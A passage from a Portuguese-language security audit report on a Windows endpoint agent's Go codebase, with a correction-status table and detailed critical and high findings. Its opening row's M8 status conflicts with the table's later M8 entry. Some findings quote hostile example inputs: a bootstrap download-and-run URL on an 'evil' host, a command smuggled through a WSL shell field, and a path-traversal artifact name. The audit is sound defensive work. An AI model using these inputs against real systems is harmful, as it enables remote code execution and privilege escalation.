| **M8** — SQLite sem migrations | ✅ Corrigido (versionamento `PRAGMA user_version`; divergência = drop-and-recreate — cache descartável, decisão do dono; aditivos preservam dados) |

> **Data:** 2026-02-10 · **Branch:** `dev` (HEAD `2d28aa0`, v1.2.1)
> **Metodologia:** revisão estática (somente leitura) por 5 revisores paralelos — (1) domínio P2P, (2) core de infraestrutura (agentconn/ai/selfupdate/database/tlsutil/netproxy), (3) automação/execução remota, (4) hub `app` e bridges, (5) frontend + build/CI — com validação amostral independente dos achados críticos/altos e `go vet ./...` limpo (exit 0).
> **Escopo analisado:** 454 arquivos Go (~79,6 mil linhas, 87 arquivos de teste) + 39 arquivos frontend (~12,6 mil linhas) + workflows CI + instalador NSIS + scripts de build.

---

## 0. Status das Correções (atualização 2026-09-10)

> **Fase 1 executada** — detalhamento completo em `DOCs/PLANO_CORRECOES_RELATORIO_ANALISE.md`.
> **Verificação:** `go vet ./...` limpo (exit 0) e `go test ./app/... -count=1` **100% OK**; `-race` nos pacotes `p2p` e `mcp`. Correções NSIS (A12/A13) pendentes de build do instalador no CI.

| Item | Status |
|---|---|
| **C1** — self-update HTTP sem SHA-256 | ✅ Corrigido (hash obrigatório; divergência fatal no caminho principal e no fallback) |
| **C2** — P2P aceita binário sem hash | ✅ Corrigido (P2P recusado sem hash de referência; verificação incondicional) |
| **C3** — transporte libp2p sem auth | ⏸️ Postergado (autenticação em momento posterior — decisão do dono) |
| **C4** — HMAC do onboarding com deployKey | ℹ️ Intencional (zero-touch para parque grande; restrição futura próxima) |
| **C5** — bridge HTTP de debug expõe tudo | ℹ️ Intencional (debug/teste da UI pelo navegador quando necessário) |
| **C6** — `Users:(M)` em `%ProgramData%\Discovery` | 📋 Avaliado — plano em `DOCs/PLANO_CORRECOES_RELATORIO_ANALISE.md` §2 (re-adoção de core, RPC de config, recovery) |
| **C7** — `Everyone:(F)` no staging (LPE) | ✅ Corrigido (`EnsureSharedStagingAccess`: SYSTEM/Admins F, Everyone RX, SIDs por número) |
| **A1** — dedup retorna `"approved"` | ✅ Corrigido (dedup reflete o resultado real; pendente enquanto aguarda decisão) + testes |
| **A2** — IPC para qualquer usuário | 📋 Plano (§3 do plano) — requisito multiusuário mantido; handshake por token de sessão proposto |
| **A3** — tokens em texto plano | ✅ Fase 1 corrigida (DACLA restrita quando elevado) · 📋 Fase 2 DPAPI planejada (§4/§5) |
| **A4** — onboard sem auth | ⏸️ Postergado (par de C3/C4) |
| **A5** — conflito de identidade libp2p | ✅ Corrigido (identidade persistente + blocklist TTL 15min + registry com lastSeen) |
| **A6** — path traversal via manifest | ✅ Corrigido (sanitização + rejeição de divergência nome solicitado) |
| **A7** — race `ArtifactFetchState` | ✅ Corrigido (`mutate`/`snapshot` sob lock; validado com `-race`) |
| **A8** — Authenticode morto / MotW | ⏸️ Postergado (depende de assinatura de código no CI — M24) |
| **A9** — panic `serverSHA256[:12]` | ✅ Corrigido (`shortHash` com guarda) |
| **A10** — token em `nats://` claro | ⏸️ Postergado (decisão de transporte — fase de hardening) |
| **A11** — TLS pinning não aplicado | ⏸️ Postergado (decisão de transporte — fase de hardening) |
| **A12** — bootstrap stage2 fraco | ✅ Corrigido (HTTPS-only no `/PU`; sem hash válido = Abort; Authenticode futuro) |
| **A13** — `/KEY=` no installer.log | ✅ Corrigido (CommandLine oculta; log estruturado sem segredos) |
| **A14** — injeção via `shell` WSL | ✅ Corrigido (validação em camadas + quoting) + testes |
| **A15** — race fatal `s.deferByTask` | ✅ Corrigido (leitura sob lock) |
| **A16** — MCP shutdown panic/leak | ✅ Corrigido (cancelRun + WaitGroup antes do close; semáforo condicional) · `-race` OK |
| **A17** — watcher WTS inerte | ✅ Corrigido (`0x02B1` + `NOTIFY_FOR_ALL_SESSIONS`) |
| **B1** — token curto em log | ✅ Corrigido (token ≤8 chars mascarado por completo) |
| **B2** — GetChatConfig sem máscara | ✅ Corrigido (sentinel `********` no Get; Set preserva chave vazia/mascarada; Test resolve sentinel) |
| **B3** — Broadcast IPC serializado | ✅ Corrigido (snapshot sob lock, escrita fora, mutex de escrita por conn — também na UI->RespondTo/hello_ack) |
| **B4** — goroutines cruas | ✅ Corrigido (2 sites → `safeGo`) |
| **B5** — `pollDropped` zerado / URLs sem handler | ✅ Métrica incrementada no drop SSE · ℹ️ `BuildArtifactAccess` NÃO é morto (2 callers libp2p/status); URL `/p2p/artifact` sem rota fica ligada ao C3 |
| **B6** — mensagem órfã no histórico | ✅ Corrigido (pop em falha do request sync) |
| **B7** — erro de auth headers engolido | ✅ Corrigido (falha cedo com log) |
| **B8** — delimitadores em ordem errada | ✅ Corrigido (fecha aspa antes dos brackets, LIFO) |
| **B9** — cache sem TTL/single-flight | ✅ Corrigido (janela 5min + `TryLock` single-flight) + testes ajustados/novos (`-race`) |
| **B10** — retry re-aplica POST/PUT | ✅ Corrigido (só GET/HEAD/OPTIONS) |
| **B11** — `started`/`ctx`/`cancel` sem sync | ✅ Corrigido (sob `c.mu`) |
| **B12** — GET serve `.partial`/`.meta` | ✅ Corrigido (rejeita `.partial`/`.meta`/`.meta.json` além de `.importing`) |
| **B13** — Google Fonts externas | ✅ Removidas (@import + preconnect; fallbacks de sistema já existem) |
| **B14** — injeção de CSS via `workflowState.color` | ✅ Corrigido (`safeCssColor`/`safeStatusBadgeStyle` com allowlist hex/rgb; aplicado no card e no detalhe) |
| **B15** — try/catch em promise não aguardada | ✅ Corrigido (`.catch` em `app-init.js` e `app-chat.js`; `app-p2p.js` já usa async/await) |
| **B16** — `join("\n")` literal | ✅ Corrigido (join com newline) |
| **B17** — `setInterval` nunca limpo | ✅ Corrigido (handle em `window.__p2pDebugRefreshTimer` + clear dup) |
| **B18** — dead code `startThinkingStatusUpdates` | ✅ Removida (função sem callers; `stop*` mantida) |
| **B19** — `escapeHtmlAttr` apaga backticks | ✅ Corrigido (escapa `&#96;` em vez de apagar) |
| **B20** — choco/MinGW sem pin (CI) | ⏸️ Postergado (pin de versão/SHA exige validação de CI — parear com M22/M24) |
| **B21** — config.json por concatenação (NSIS) | ⏸️ Postergado (escaping em NSIS exige plugin StrFunc + build do instalador para validar) |
| **B22** — `${API_KEY}` em heredoc (build server) | ⏸️ Postergado (script de build do servidor; requer jq/estruturação e validação Linux — secret em artefato segue no backlog) |
| **B23** — dispatcher órfão em `Accept()` | ✅ Corrigido (monitor de morte do pai via Toolhelp32 + `WaitForSingleObject` → exit libera pipes) |
| **M1** — diff de inventário sempre "modificado" | ✅ Corrigido (fingerprint estável: strip de updatedAt/collectedAt no diff) |
| **M2** — toast headless sem botões | ✅ Corrigido (actions normalizadas para []any na fonte; toast aceita ambos os tipos) |
| **M3** — race `deferredRestartState` | ✅ Corrigido (snapshot sob lock no callback do AfterFunc) |
| **M4** — SQLite fechado com goroutines ativas | ✅ Corrigido (decisão do dono: 5s + contador `startupPhasePending` logado no shutdown) |
| **M5** — fallback standalone inicia 2º core | ✅ Corrigido (decisão do dono: UI somente interface, SEM fallback; controller notifica perda/volta do serviço) |
| **M6** — `--agent-delete-cleanup` sem confirmação | ✅ Corrigido (exige processo elevado; exit 1 caso contrário) |
| **M7** — netproxy SSRF (redirect + DNS TOCTOU) | ✅ Corrigido (CheckRedirect revalida allowlist; dialer pinça IP validado; `Allowlist.ContainsIP`) |
| **M8** — SQLite sem migrations | ⏸️ Postergado (PRAGMA user_version + testes de upgrade em bancos reais — rodada própria) · ❓ **Decisão pendente do dono:** dados do discovery.db preserváveis ou descartáveis? |
| **M9** — chat log sem rotação/retention | ✅ Corrigido (rotação 10MB, retenção 7d, máx 7 backups) |
| **M10** — goroutines ilimitadas no NATS fallback | ✅ Corrigido (semáforo de 8 com backpressure) |
| **M11** — replicação sem deadline / Gone=sucesso | ✅ Corrigido (SetDeadline 10s; Gone é falha) |
| **M12** — retry sem backoff na re-eleição | ✅ Corrigido (backoff exponencial 1m→30m com FailCount) |
| **M13** — icacls spawnado a cada p2pTempDir | ✅ Corrigido (`sync.Once` por processo nos 2 sites) |
| **M14** — hash sob lock + re-hash de manifest | ✅ Corrigido (compute fora do lock com double-check; cache do health-check por mtime) |
| **M15** — knob de bandwidth sem efeito | ✅ Corrigido (token bucket global no sender+receiver; configurável via servidor 10-100 MB/s, default sem limite) |
| **M16** — LAN probe 2min + /p2p/health recon | ✅ Mitigado (hostname removido do health; probe 2min→5min; auth completa = C3) |
| **M17** — JSON em atributo + catch vazio | ✅ Corrigido (feedback de erro + chaves PT/EN) |
| **M18** — bridge HTTP descarta multi-args | ✅ Corrigido (servidor aceita array JSON com bind posicional; client envia array quando N>1) |
| **M20** — command injection nos workflows | ✅ Corrigido (inputs → `env:` nos 2 workflows de build) |
| **M21** — chave como input plaintext | ✅ Corrigido (`secrets.AGENT_DEFAULT_KEY`; input deprecado como fallback) |
| **M22** — actions sem pin de SHA | ⏸️ Postergado (SHAs reais + validação de CI — parear com M24/B20) |
| **M23** — permissions no nível do workflow | ✅ Corrigido (`permissions: {}` no raiz; `contents: write` só no job release) |
| **M24** — artefatos sem assinatura | ⏸️ Postergado (requer certificado de codesigning — decisão comercial) |
| **M25** — Taskfile sem buildinfo.Version | ✅ Corrigido (ldflags Version/Commit no UI e serviço) |
| **M26** — nil deref + panic no cron | ✅ Corrigido (cron.Recover + guards de nil) |
| **M27** — leak de NewCallback em GetMonitors | ✅ Corrigido (callback único por processo) |
| **M28** — junctions em copy/zip | ✅ Corrigido (isReparsePoint nos loops) |
| **M29** — sandbox fileserver nominal | ✅ Corrigido (decisão do dono: disco inteiro mantido + auditoria de operações mutantes — log local + evento `files_audit` ao servidor, gate `DISCOVERY_FILES_AUDIT`) |
| **M30** — RunScript sem gate/hash | ✅ Corrigido (verifica SHA256 do script, algoritmo espelhado do servidor) |
| **M31** — tools destrutivas MCP sem gate | ✅ Corrigido (confirm=true obrigatório em uninstall/upgrade_all/restart_spooler/clear_queue) |
| **M32** — cmdType desconhecido vira shell | ✅ Corrigido (rejeita com erro claro) |
| **M33** — gravação nunca inicia | ✅ Corrigido (RecordingSource.Start/Stop reais no manager) |
| **M34** — cron na TZ local | ✅ Corrigido (UTC explícita + override DISCOVERY_AUTOMATION_TZ) |
| **M19** — node_modules embedados (exe ~78 MB) | ✅ Otimizado — toolchain movida para `src/tools/a2ui` (funcionalidade A2UI preservada); frontend embedado 32,7 MB → 1,41 MB |
| **Melhoria 16** — sync.Pool de buffers de frame | ✅ Implementado — `screen/frame_pool.go` + buffers reutilizáveis nos 3 capturers + copy do session_screen via pool (ver DOCs/PLANO_CORRECOES §8) |
| **LOOP self-update** (homologação 13/09) | ✅ Mitigado — circuit breaker persistido: 3 instalações da mesma versão sem buildinfo mudar → checks pausados com log CRÍTICO. Causa raiz operacional: binário servido pela API compilado sem `-X buildinfo` (recompilar com `--version`); M25 corrige Taskfile local |
| Demais B20-B22 (CI) | ⏸️ Postergados (parear com M22/M24 numa rodada de CI) |

> **Regra de manutenção:** novos status entram aqui e no plano; o corpo dos achados permanece como estava na data da análise.

---

## 1. Sumário Executivo

| Severidade | Quantidade | Áreas mais afetadas |
|---|---|---|
| 🔴 Crítica | 7 | self-update, P2P, staging de instaladores (LPE), debug HTTP, instalador NSIS |
| 🟠 Alta | 17 | P2P, notificações/IPC, automação/MCP, agentconn, build |
| 🟡 Média | 34 | distribuídas |
| ⚪ Baixa | 23 | distribuídas |

**Total: 81 achados** (7 críticos + 17 altos + 34 médios + 23 baixos), além de ~25 melhorias estruturais/performance/CI.

**Temas recorrentes:**

1. **Canais internos sem autenticação** — o agente expõe serviços que aceitam requisições sem verificar quem chama: transporte libp2p de artefatos, endpoint HTTP de onboarding P2P (0.0.0.0), bridge HTTP de debug (reflexão sobre todos os métodos do App) e named pipe IPC acessível a todo o grupo `Users`. Há infraestrutura de autenticação implementada (`issueTokenLocked`/`verifyToken`, HMAC) que **não é invocada em produção** — só em testes.
2. **Integridade do self-update** — o mecanismo que substitui o binário do agente (executado elevado) aceita arquivos sem verificação efetiva de SHA-256 no caminho HTTP e de qualquer peer no caminho P2P quando o hash é desconhecido.
3. **Segredos e staging com ACL permissivos** — token do agente (`mdz_...`) e deploy token persistidos em `%ProgramData%\Discovery` com ACL `Users:(M)` (config poisoning); e o diretório de staging de instaladores (`%WINDIR%\Temp\Discovery\P2P_Temp`) recebe `Everyone:(F)` enquanto o SYSTEM executa os binários dali — elevação local de privilégio.
4. **Código de segurança "morto"** — validação Authenticode, pinning TLS e verificação de token P2P existem como código/config, mas nunca são executados em produção — dão falsa sensação de proteção.
5. **Data races e crashes de concorrência** — `ArtifactFetchState` (P2P), `deferredRestartState`, `s.deferByTask` na automação (fatal error do runtime), panic no shutdown do MCP server, `started/ctx` do Coordinator (detectáveis com `-race`).

**Verificação de build:** `gofmt` reporta apenas arquivos de raiz/cmd (formatação menor); `go vet ./...` passa sem nenhum aviso.

---

## 2. Achados Críticos

### C1 — Self-update: download HTTP do instalador nunca é verificado contra o SHA-256 do servidor
**Área:** `app/core/selfupdate` · **Severidade:** 🔴 Crítica
**Arquivo:** `src\app\core\selfupdate\updater_network.go:268-272`, `updater.go:561-572` e `updater.go:670-672`

```go
// updater_network.go:271 — retorna o sha calculado SEM comparar com expectedSHA256
path, sha, httpErr = u.downloadFromURL(ctx, downloadURL)
return path, sha, false, httpErr
```

No caminho principal o arquivo vai direto para `extractFileVersion → persistPendingInstallState → launchInstallerWithUI` (execução elevada via `ShellExecuteEx "runas"`). No caminho de fallback (`checkAndUpdateFallback`), a divergência é **apenas logada** e o fluxo continua:

```go
// updater.go:670-672
if publicSHA256 != "" && !strings.EqualFold(fileSha256, publicSHA256) {
    u.logf("[selfupdate] ALERTA: SHA256 divergente do servidor! ...")
}
```

**Impacto:** download corrompido, cache envenenado, proxy comprometido ou MITM resulta em execução de binário arbitrário com privilégios de admin/SYSTEM — mesmo quando o servidor informa o hash correto.
**Correção:** comparar `sha` com `expectedSHA256` após `downloadFromURL` e **abortar** (remover temp + reportar erro) em caso de ausência/divergência; no fallback, tratar divergência como erro fatal.

### C2 — Self-update: P2P aceita binário de qualquer peer sem verificação quando o SHA-256 é desconhecido
**Área:** `app/core/selfupdate` · **Severidade:** 🔴 Crítica
**Arquivo:** `src\app\core\selfupdate\updater_network.go:205-261` (+ `updater_install.go:52` chama com `""`)

```go
artifactID := "selfupdate:current"
if expectedSHA256 != "" { ... }
// ...
if expectedSHA256 != "" && !strings.EqualFold(actual, expectedSHA256) { // pulado se expected == ""
```

Com `expectedSHA256 == ""` (fetch do hash falhou ou `serverInfo.Sha256` vazio), qualquer arquivo de qualquer peer é aceito. Peers são máquinas de usuários comuns; um peer comprometido distribui um "instalador" malicioso que o agente executa elevado.
**Correção:** nunca instalar sem hash esperado — recusar P2P quando `expectedSHA256 == ""` e cair para HTTP com verificação obrigatória (C1).

### C3 — Transporte libp2p serve artefatos sem nenhuma autenticação
**Área:** `app/p2p` · **Severidade:** 🔴 Crítica
**Arquivo:** `src\app\p2p\p2p_libp2p_transport.go:165-187, 328-349`; gater em `p2p_libp2p.go:470-483`

`handleStreamArtifactGet` faz `SanitizeArtifactName` + `os.Open` + `io.Copy` sem verificar token/clientId/allow-list. O token HMAC emitido por `BuildArtifactAccess` **nunca é verificado**: `verifyToken` (`p2p_http.go:334`) só tem chamadores em teste. O gater aceita qualquer conexão (`InterceptAccept → true`) e o rendezvous mDNS `discovery-agent-v1` é constante pública.
**Impacto:** qualquer host da LAN com libp2p abre `/artifact/get/1.0.0`, `/artifact/manifest/1.0.0`, `/discovery/peers/1.0.0` e baixa/mapeia todo o catálogo — incluindo instaladores e artefatos de self-update.
**Correção:** verificar token (a infra já existe) ou validar clientId+registry no início de cada handler; restringir o gater a peer.IDs conhecidos.

### C4 — Assinatura HMAC do onboarding usa o próprio deployKey como chave (proteção inexistente)
**Área:** `app/p2p` · **Severidade:** 🔴 Crítica
**Arquivo:** `src\app\p2p\onboarding.go:28-35` + `src\app\p2p_onboarding.go:299-311`

```go
// Key = deployKey itself (self-contained; no out-of-band shared secret needed).
mac := hmac.New(sha256.New, []byte(deployKey))
```

A chave HMAC é o campo `DeployKey` que **viaja no payload** — quem forja a oferta computa a assinatura válida. A validação termina em `registerWithDeployKey(offer.ServerURL, offer.DeployKey)`: qualquer host da rede pode registrar o agente não configurado contra servidor controlado pelo atacante (que persiste credenciais e recebe TPM EK/SMBIOS UUID).
**Correção:** assinar com segredo que o receptor possa validar sem conhecer o conteúdo (ou validar o deployKey contra o servidor antes de persistir); não confiar em `serverURL` da oferta.

### C5 — Bridge HTTP de debug expõe todos os métodos do App por reflexão, sem autenticação
**Área:** `app` (debughttp) · **Severidade:** 🔴 Crítica
**Arquivo:** `src\app\debug_http.go:361-434` (início em `:130-132`; ativado em `app.go:1130-1139` quando `DebugMode`)

```go
v := reflect.ValueOf(a)
m := v.MethodByName(methodName)  // qualquer método exportado, 0-1 params
```

`/api/GetDebugConfig` serializa `debug.Config` com `AuthToken string \`json:"authToken"\`` (`debug\config.go:18`); `/api/GetChatConfig` retorna a API key do LLM sem máscara; `Install`, `Uninstall`, `Upgrade`, `SetChatConfig` e `SetDebugHTTPBindAllInterfaces` são acionáveis por POST, sem checagem de Origin/Content-Type (drive-by local). `SetDebugHTTPBindAllInterfaces(true)` rebinda em `0.0.0.0` e o CORS vira `*`.
**Impacto:** qualquer processo local (qualquer usuário) lê `http://127.0.0.1:<porta>/api/GetDebugConfig` e obtém o token do agente; com bind-all, a rede inteira lê.
**Correção:** whitelist explícita de métodos (eliminar reflexão), mascarar tokens nas respostas, exigir token de sessão no header e bloquear rebind `0.0.0.0` fora de build dev.

### C6 — Instalador NSIS concede `Users:(M)` sobre `%ProgramData%\Discovery` (contém deployToken)
**Área:** instalador · **Severidade:** 🔴 Crítica
**Arquivo:** `src\build\windows\installer\project.nsi:839, 1093` (config em `:859-892`)

```nsis
icacls.exe "$R0\Discovery" /inheritance:e /grant "*S-1-5-18:(OI)(CI)(F)" "*S-1-5-32-544:(OI)(CI)(F)" "*S-1-5-32-545:(OI)(CI)(M)" /T /C /Q
...
FileWrite $0 '  "deployToken": "$ServerKey",$\r$\n'
```

Qualquer usuário local pode **ler** o deploy token e **reescrever** `serverUrl`/`deployToken` do `config.json` (config poisoning → agente apontado para servidor do atacante). Combina com o achado A3 (tokens em texto plano sem DPAPI).
**Correção:** `Users` apenas Read/Execute; `config.json` restrito a SYSTEM/Administrators; separar o que o runtime precisa escrever.

### C7 — `Everyone:Full Control` no diretório de staging de instaladores executados como SYSTEM (elevação local de privilégio)
**Área:** `core/platform` + automação P2P · **Severidade:** 🔴 Crítica
**Arquivo:** `src\app\core\platform\perms_windows.go:30` (+ `p2p\p2p.go:526-527`, `p2p_cleanup.go:25`, `automation_p2p.go:269-271, 838, 850`, `paths.go:46-51`)

```go
cmd := exec.Command("icacls.exe", path, "/grant", "Everyone:(OI)(CI)F", "/Q")
```

`TempDir()` = `%WINDIR%\Temp\Discovery` e `P2PTempDir()` = `%WINDIR%\Temp\Discovery\P2P_Temp` recebem `EnsureWorldAccess` (Full Control para Everyone, herdado). A automação executa o instalador dali: `artifactPath := filepath.Join(m.app.p2pTempDir(), artifact)` → `executeHiddenProcess(...)` / `msiexec /i <path>` (agente como SYSTEM).
**Impacto:** o checksum protege a transferência, mas não a janela pós-download (TOCTOU): usuário local substitui o .exe/.msi após a verificação; `findLocalArtifactByID` aceita manifest+arquivo forjados no diretório world-writable → **elevação local de privilégio para SYSTEM**.
**Correção:** conceder `Everyone:(OI)(CI)RX` (não F) mantendo Full para SYSTEM/Admins, ou mover o staging para DACL restrita; re-verificar hash imediatamente antes do `CreateProcess` (abrir com share exclusivo e executar pelo handle).

---

## 3. Achados Altos

### A1 — Dedup de notificação retorna `"approved"` sem confirmação do usuário (bypass do `require_confirmation`)
**Arquivo:** `src\app\services\notifications\service.go:175-199`
No retry com a mesma `IdempotencyKey`, o dispatch retorna `Result: "approved"` mesmo que a notificação original esteja **pendente** ou tenha sido **negada** (entrada vive 24h no mapa). Comandos que dependem de confirmação são aprovados automaticamente pelo retry — `remote_debug_commands.go:218` confirma o uso: `if notifResp.Result == "approved"`.
**Correção:** guardar o estado da notificação original (pending/approved/denied) e reencaminhar a resposta do mesmo ID em vez de "approved".

### A2 — Named pipe IPC aceita qualquer usuário local; mensagens injetadas aprovam confirmações e disparam remote session
**Arquivo:** `src\app\ipc_windows.go:33` + `src\app\ipc_app_integration.go:43-56`

```go
const ipcPipeSDDL = "D:(A;;GA;;;SY)(A;;GA;;;BU)" // GenericAll p/ Builtin Users
```

`IPCMsgNotificationRespond` injeta resposta em prompts `require_confirmation`; `IPCMsgRemoteSession` re-broadcasta para as UIs (que executam `handleCompanionRemoteSession`); RPCs de leitura (logs, config, inventário) também ficam expostos.
**Correção:** restringir SDDL ao SID da sessão da UI, autenticar o cliente no handshake (token de sessão com ACL restrita) e validar o processo chamador antes de aceitar mensagens mutantes.

### A3 — Tokens/credenciais em texto plano em `%ProgramData%\Discovery` (sem DPAPI)
**Arquivo:** `src\app\installer\service.go:289` (config.json com deployToken/AuthToken), `src\app\debug\service.go:158` (debug_config.json), `src\app\services\chat\service.go:172` (chat_config.json)

`os.WriteFile(path, data, 0o600)` — no Windows o modo é no-op: o arquivo herda a ACL do diretório (com `Users:(M)` do C6). Qualquer usuário local lê o token do agente e o deploy token.
**Correção:** criptografar com DPAPI (`CryptProtectData`) ou credential store; no mínimo endurecer ACL na criação do arquivo.

### A4 — `GET /p2p/config/onboard` sem autenticação entrega deploy key real a qualquer host da rede
**Arquivo:** `src\app\p2p\p2p_onboarding_http.go:34-64` (rota em `p2p_http.go:108`; listener 0.0.0.0 em `helpers.go:41`)
`handleOnboardOffer` emite provisioning token válido (TTL 30 min) para qualquer chamador que varrer as portas 41080-41120 — permite registrar agente rogue e consome o token single-use.
**Correção:** exigir prova de posse de identidade (desafio HMAC/nonce por peer conhecido) ou restringir a emissão a peers validados na malha.

### A5 — Conflito de identidade libp2p bloqueia peer reiniciado para sempre
**Arquivo:** `src\app\p2p\p2p_libp2p.go:190-199, 134-140, 443-447`; `p2p_libp2p_peer_registry.go:67-75`
Conflito `RegisterStrict` → `BlockPeer` (append-only, nunca remove); host criado **sem identidade persistente** → novo peer.ID a cada restart. Pares que conheceram o ID antigo bloqueiam o novo em `InterceptSecured`: peer fica permanentemente inalcançável (partição da malha).
**Correção:** identidade libp2p persistida em disco, aging/TTL na registry e expiração na blocklist.

### A6 — Path traversal no cliente P2P via `manifest.ArtifactName` remoto
**Arquivo:** `src\app\p2p\p2p_chunks.go:248, 413` (manifest validado em `:527-560` sem validar o nome)
`partsDir := filepath.Join(destDir, manifest.ArtifactName+".parts")` — o manifest vem do peer remoto; um peer malicioso envia `..\..\Users\...\Startup\evil.exe` e faz o agente gravar fora do `P2P_Temp`.
**Correção:** `manifest.ArtifactName = SanitizeArtifactName(...)` (rejeitando vazio) + conferir com o nome solicitado.

### A7 — Data race em `ArtifactFetchState` (mutações fora do `fetchStates.mu`)
**Arquivo:** `src\app\p2p\p2p_fetch_election.go:129-139, 201-206, 218-221, 236-246`; `p2p_libp2p_fetch.go:67-73`
`state.OwnerPeerID = ...; state.Status = "fetching"` fora de lock, enquanto `publishFetchHeartbeats`/`runPendingElections`/`handleStreamFetchHeartbeat` leem/escrevem os mesmos campos (com e sem lock). Corrompe eleição/lease.
**Correção:** encapsular mutações em métodos com lock no `fetchStateMap`.

### A8 — Validação Authenticode é código morto; MotW removido antes de executar
**Arquivo:** `src\app\core\selfupdate\updater_utils.go:87-115` (sem callers), `agentconfig\parse.go:499` (`RequireSignatureValidation` parseada e ignorada), `launch_windows.go:60-74` (remove `Zone.Identifier`)
O fluxo de update executa .exe de rede sem checagem de assinatura e ainda remove a proteção SmartScreen; a policy dá falsa sensação de enforcement.
**Correção:** chamar `validateAuthenticodeSignature` antes do launch quando `RequireSignatureValidation=true` (idealmente sempre); remover MotW só quando a assinatura for `Valid`.

### A9 — Panic `serverSHA256[:12]` mata permanentemente o loop de self-update
**Arquivo:** `src\app\core\selfupdate\updater.go:539`
Com `Sha256 == ""` do servidor, `""[:12]` → panic; o recover do `safeGo.Go` engole e a goroutine morre **sem restart** — o agente para de checar atualizações até reinício do processo, silenciosamente.
**Correção:** truncar com guarda (`if len(s) > 12`) ou validar o endpoint `/version` para exigir sha256 de 64 chars.

### A10 — Token do agente trafega em texto claro em `nats://` remoto; validação de transporte não cobre NATS
**Arquivo:** `src\app\core\agentconn\runtime_security.go:237-247` + `runtime.go:836-847` + `runtime_nats.go:78-82`
`validateTransportSecurity` valida só `ApiScheme` https; `autoDeriveNATSEndpoints` deriva host nativo "independente de público/privado" e `runSession` tenta `nats://` primeiro — no protocolo NATS sem TLS o `auth_token` vai em claro (token de longa duração `mdz_...`).
**Correção:** recusar `nats://`/`ws://` para hosts não-locais (exigir `tls://`/`wss://`, salvo override de lab) e preferir WSS quando o host for público.

### A11 — TLS pinning configurado, mas nunca aplicado (código morto em produção)
**Arquivo:** `src\app\core\agentconn\runtime.go:624-625`; `runtime_security.go:66-84, 154-195, 938`
`ApiTLSCertHash`/`NatsTLSCertHash` são normalizados a cada Run, mas `evaluateTLSPinPolicy`/`observeTLSPeerCertHash`/`reportTLSMismatch` só são chamados em testes. MITM com certificado válido para o hostname passa; o report de `tls-mismatch` nunca dispara.
**Correção:** observar o peer cert nas sessões reais e aplicar a policy quando `EnforceTLSHashValidation=true` — ou remover a UI/config.

### A12 — Bootstrap NSIS executa stage2 com integridade fraca
**Arquivo:** `src\build\windows\installer\project.nsi:1011-1053, 420-427`
Hash dinâmico baixado de `$PayloadUrl/sha256` (mesma origem do payload — auto-referencial); fallback final `"Prosseguindo..."` (linha 1041) executa o binário **sem verificação**; override runtime `/PU=` (`:420-427`) sem validação de scheme HTTPS (existe só no build). `bootstrap.exe /PU=http://evil/x.exe` baixa e roda como admin.
**Correção:** abortar sem hash válido; validar HTTPS no `.onInit`; ideal: validar assinatura Authenticode (WinVerifyTrust) em vez de sha256 auto-declarado.

### A13 — Token `/KEY` registrado em claro no `installer.log`
**Arquivo:** `src\build\windows\installer\project.nsi:220` (+ `ExecToLog` em `:1066-1070`)
`FileWrite $R9 "CommandLine: $CMDLINE$..."` grava `/KEY="$ServerKey"` em claro no `installer.log` — diretório com ACL `Users:(M)` (C6). Contraria a própria SECURITY.md ("Em logs, mascarar valores sensíveis").
**Correção:** mascarar `/KEY=` antes de gravar e não usar `ExecToLog` nas linhas que contêm a chave.

### A14 — Injeção de comando via campo `shell` da sessão remota (distro WSL sem validação)
**Área:** `core/terminal` + remotesession · **Severidade:** 🟠 Alta
**Arquivo:** `src\app\core\terminal\pty_conpty_shell.go:133-158` (+ `remotesession\manager.go:614-617`)
O payload `shell` vem do servidor sem validação: `defaultShell = terminal.ShellKind(sk)`; `IsWSL(shell)` → `{"-d", distro}`; `buildCommandLine` faz `strings.Join(args, " ")` sem quoting/escape. `shell: "wsl:Ubuntu --exec cmd /c whoami"` vira `"wsl.exe" -d Ubuntu --exec cmd /c whoami` — RCE genérico no host para qualquer ator com poder de emitir comando de sessão (backend comprometido, viewer comprometido).
**Correção:** validar o ShellKind contra a lista de shells disponíveis (`IsWSLAvailable()`/`term.ready`) ou aceitar apenas `[A-Za-z0-9 ._-]` na distro; montar o CreateProcessW com argumentos separados em vez de command line string.

### A15 — Data race fatal em `s.deferByTask` na execução de automação (derruba o processo)
**Área:** `core/automation` · **Severidade:** 🟠 Alta
**Arquivo:** `src\app\core\automation\service.go:633` (escritas: `service_state.go:78-80`, `service_psadt.go:28-30`)
`s.dispatchExecutionNotification(..., s.deferByTask[taskID], ...)` lê o mapa **sem lock** na goroutine de execução, enquanto `loadDeferStateForAgent` substitui o mapa inteiro a cada policy-sync e `recordAndGetNextDefer`/`clearDeferState` escrevem sob `s.mu`. Leitura concorrente de map com escrita = **fatal error do runtime** (não é panic recuperável) — derruba o agente inteiro. Snapshot correto já existe capturado sob lock na linha 503.
**Correção:** usar o snapshot da linha 503 ou reler sob `s.mu.RLock()`.

### A16 — MCP server: panic "send on closed channel" no shutdown + leak do semáforo
**Área:** `core/mcp` · **Severidade:** 🟠 Alta
**Arquivo:** `src\app\core\mcp\server.go:118-144`
(a) `close(respCh)` (linha 142) executa antes do `defer cancelRun()` — goroutines de `tools/call` em voo fazem `select { case respCh <- resp: ... case <-runCtx.Done(): }` com `runCtx` ainda não cancelado → send em canal fechado → **panic/crash do agente** (cliente MCP fechando stdin durante um tool call longo). (b) `defer func(){ <-sem }()` roda mesmo quando a goroutine saiu sem adquirir a vaga — se o semáforo estiver vazio, `<-sem` bloqueia para sempre (goroutine leak).
**Correção:** chamar `cancelRun()` imediatamente após o loop de leitura (antes do `close(respCh)`) e liberar o semáforo somente quando adquirido (flag `acquired`).

### A17 — Watcher de logon WTS nunca dispara (mensagem e flag erradas)
**Área:** `core/automation` · **Severidade:** 🟠 Alta
**Arquivo:** `src\app\core\automation\userlogin_watcher_windows.go:31, 57`
`wtsRegisterSessionNotification(hwnd, 0)` registra só para a própria sessão (0 = `NOTIFY_FOR_THIS_SESSION`; serviço precisa de `NOTIFY_FOR_ALL_SESSIONS` = 1) e o filtro espera `0x0400+1` (WM_USER+1), mas notificações WTS chegam como `WM_WTSSESSION_CHANGE = 0x02B1`. O watcher "registra com sucesso" e nunca dispara — `TriggerOnUserLogin` por evento real não executa (só o fallback one-shot por processo), falha silenciosa.
**Correção:** usar `0x02B1` e flag `1`.

---

## 4. Achados Médios

| # | Área | Arquivo:linha | Achado |
|---|------|---------------|--------|
